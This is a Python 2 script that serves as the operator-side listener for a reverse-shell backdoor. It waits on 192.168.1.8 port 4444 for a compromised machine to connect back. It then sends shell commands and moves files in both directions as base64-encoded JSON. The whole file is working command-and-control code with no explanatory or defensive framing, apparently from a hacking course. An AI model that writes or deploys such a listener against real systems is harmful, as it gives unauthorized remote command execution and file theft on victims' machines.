import socket, json, base64


class Listener:
      def __init__(self, ip, port):
          listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
          listener.bind((ip, port))
          listener.listen(0)
          print("[+] Waiting  for incoming connections")
          self.connection, address = listener.accept()
          print("[+] Got a connection from" + str(address))

      def send_as_json(self, data):
          json_data = json.dumps(data)
          self.connection.send(json_data)

      def receive_as_json(self):
          json_data = ""
          while True:
                try:
                   json_data += self.connection.recv(1024)
                   return json.loads(json_data)
                except ValueError:
                    continue
 
      def execute_remotely(self, command):
          self.send_as_json(command)

          if command[0] == "exit":
             self.connection.close()
             exit()

          return self.receive_as_json()

      def write_file(self, path, content):
          with open(path, "wb") as file:
               file.write(base64.b64decode(content))
               return "[+] Download Successful"

      def read_file(self, path):
          with open(path, "rb") as file:
               return base64.b64encode(file.read())

      def run(self):
          while True:
                command = raw_input(">> ")
                command = command.split(" ")

                try:
		    if command[0] == "upload":
	                file_content = self.read_file(command[1])
	                command.append(file_content) 

		    result = self.execute_remotely(command) 
		                      
		    if command[0] == "download":
		        result = self.write_file(command[1], result)
                except Exception:
                     result = "[-] Error during command execution"  

                print(result)

my_listener = Listener("192.168.1.8", 4444)
my_listener.run()




